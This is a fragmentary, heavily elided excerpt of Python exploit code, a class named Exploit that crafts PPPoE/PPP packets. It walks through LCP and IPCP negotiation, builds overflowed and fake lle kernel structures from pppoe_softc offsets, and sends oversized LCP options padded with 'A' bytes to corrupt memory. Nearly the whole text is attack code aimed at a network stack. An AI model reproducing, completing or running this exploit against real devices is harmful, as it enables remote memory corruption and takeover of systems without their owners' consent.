...
class Exploit:
    ...
    def lcp_negotiation(self):
        ...
        while True:
            ...
            if (
                pkt
                and pkt.haslayer(PPP_LCP_Configure)
                and pkt[PPP_LCP_Configure].code == CONF_ACK
            ):
                break
        ...
        while True:
            ...
            if (
                pkt
                and pkt.haslayer(PPP_LCP_Configure)
                and pkt[PPP_LCP_Configure].code == CONF_REQ
            ):
                break
    ...
    def ipcp_negotiation(self):
        ...
        self.s.send(
            ...
            / PPP()
            / PPP_IPCP(
                code=CONF_ACK, id=pkt[PPP_IPCP].id, options=pkt[PPP_IPCP].options
            )
        )
    ...
    def build_overflow_lle(self):
        ...
        overflow_lle += p64(
            self.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP
        )  # lle_tbl
    ...
    def build_fake_lle(self):
        ...
        fake_lle += p64(
            self.pppoe_softc + PPPOE_SOFTC_SC_DEST - LLTABLE_LLTFREE
        )  # lle_tbl
    ...
    def run(self):
        ...
        for i in range(self.CORRUPT_NUM):
            self.s.send(
                ...
                / PPP_LCP(
                    ...
                    len=TARGET_SIZE + 4,
                    data=(
                        PPP_LCP_Option(data=b"A" * (TARGET_SIZE - 4))
        ...
        while True:
            ...
            if (
                pkt
                and pkt.haslayer(PPP_LCP_Configure)
                and pkt[PPP_LCP_Configure].code == CONF_REJ
            ):
                break
        ...
        while True:
            ...
            if (
                pkt
                and pkt.haslayer(ICMPv6NDOptSrcLLAddr)
                and pkt[ICMPv6NDOptSrcLLAddr].len > 1
            ):
                break
        ...
        if (
            self.pppoe_softc_list & 0xFFFFFFFF00000FFF
